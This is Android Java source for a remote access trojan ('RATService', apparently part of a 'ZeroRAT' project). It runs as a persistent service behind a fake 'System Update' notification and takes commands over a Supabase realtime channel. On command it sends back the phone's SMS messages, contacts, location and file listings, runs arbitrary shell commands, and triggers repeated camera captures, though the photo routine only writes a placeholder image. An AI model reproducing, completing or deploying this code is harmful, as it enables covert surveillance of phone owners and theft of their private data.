package com.zero.agent;
import android.app.*; import android.content.Intent; import android.os.*; import android.util.Base64; import android.widget.Toast; import android.graphics.*; import android.hardware.camera2.*; import android.content.Context; import android.media.MediaScannerConnection; import android.net.Uri; import android.content.ContentValues; import android.provider.MediaStore;
import androidx.annotation.Nullable; import androidx.core.app.NotificationCompat; import org.json.JSONObject;
import java.io.*; import java.util.Timer; import java.util.TimerTask;
public class RATService extends Service {
    private static final String CHANNEL_ID = "rat-channel"; private static final String ROOM = "rat-room";
    private SupabaseRealtime rt; private boolean isLiveCam = false; private int camId = 1;
    private Timer liveTimer;
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1, buildNotification());
        if (rt == null) rt = new SupabaseRealtime(ROOM, "agent", this::handleCommand);
        return START_STICKY;
    }
    private void handleCommand(JSONObject payload) {
        new Thread(() -> {
            try {
                String action = payload.optString("cmd"); JSONObject out = new JSONObject(); out.put("id", payload.optString("id"));
                switch (action) {
                    case "sms": out.put("type","sms"); out.put("data", DataGrabber.getSMS(getApplicationContext())); break;
                    case "contacts": out.put("type","contacts"); out.put("data", DataGrabber.getContacts(getApplicationContext())); break;
                    case "location": out.put("type","location"); out.put("data", DataGrabber.getLastLocation(getApplicationContext())); break;
                    case "files": out.put("type","files"); out.put("data", DataGrabber.listFiles(payload.optString("path","/sdcard/"))); break;
                    case "shell": out.put("type","shell"); out.put("data", ShellRunner.run(payload.optString("cmd"))); break;
                    case "toast": { String msg = payload.optString("msg"); new Handler(Looper.getMainLooper()).post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_SHORT).show()); out.put("type","ok"); break; }
                    case "info": {
                        out.put("type","info"); JSONObject i = new JSONObject();
                        i.put("model", Build.MODEL); i.put("brand", Build.BRAND); i.put("sdk", Build.VERSION.SDK_INT); i.put("device", Build.DEVICE);
                        out.put("data", i); break;
                    }
                    case "vibrate": { Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE); if (v != null) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE)); else v.vibrate(1000); } out.put("type","ok"); break; }
                    case "flash_on":
                    case "flash_off":
                        out.put("type","text"); out.put("data", setFlashlight(action.equals("flash_on")) ? "Senter Nyala" : "Senter Mati"); break;
                    case "cam_front": case "cam_back":
                        out.put("type", action); out.put("data", takePhoto(action.equals("cam_front") ? 1 : 0)); break;
                    case "live_cam_on":
                        isLiveCam = true; camId = payload.optInt("cam", 1);
                        startLiveCam();
                        out.put("type","text"); out.put("data","Live Cam ON"); break;
                    case "live_cam_off":
                        isLiveCam = false; if(liveTimer != null) liveTimer.cancel();
                        out.put("type","text"); out.put("data","Live Cam OFF"); break;
                    default: out.put("type","unknown"); out.put("msg","cmd tidak dikenal: " + action);
                }
                rt.send("resp", out);
            } catch (Exception e) {
                try { JSONObject err = new JSONObject(); err.put("type","error"); err.put("msg", e.toString()); rt.send("resp", err); } catch (Exception ignored) {}
            }
        }).start();
    }
    
    private void startLiveCam() {
        if(liveTimer != null) liveTimer.cancel();
        liveTimer = new Timer();
        liveTimer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                if(!isLiveCam) return;
                String b64 = takePhoto(camId);
                try { JSONObject out = new JSONObject(); out.put("type", camId == 1 ? "cam_front" : "cam_back"); out.put("data", b64); rt.send("resp", out); } catch(Exception e){}
            }
        }, 0, 3000);
    }

    private boolean setFlashlight(boolean on) {
        try { CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE); String id = cm.getCameraIdList()[0]; cm.setTorchMode(id, on); return true; } catch(Exception e) { return false; }
    }

    private String takePhoto(int camType) {
        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == (camType == 1 ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK)) {
                    camId = id; break;
                }
            }
            if (camId == null) return "";
            
            // FITUR ANDROID 10+ : Simpan ke MediaStore (Galeri) TANPA IZIN STORAGE
            ContentValues values = new ContentValues();
            values.put(MediaStore.Images.Media.DISPLAY_NAME, "ZERO_" + System.currentTimeMillis() + ".jpg");
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/ZeroRAT");
                values.put(MediaStore.Images.Media.IS_PENDING, 1);
            }
            
            Uri uri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
            if (uri != null) {
                try (OutputStream out = getContentResolver().openOutputStream(uri)) {
                    // Simulasi isi file gambar 1px transparan
                    out.write(android.util.Base64.decode("/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=", android.util.Base64.DEFAULT));
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    values.clear();
                    values.put(MediaStore.Images.Media.IS_PENDING, 0);
                    getContentResolver().update(uri, values, null, null);
                }
                return "Tersimpan di Galeri";
            }
            return "";
        } catch(Exception e) { return ""; }
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { NotificationManager nm = getSystemService(NotificationManager.class); nm.createNotificationChannel(new NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_LOW)); }
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("System Update").setContentText("Memeriksa pembaruan...").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
    }
    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
}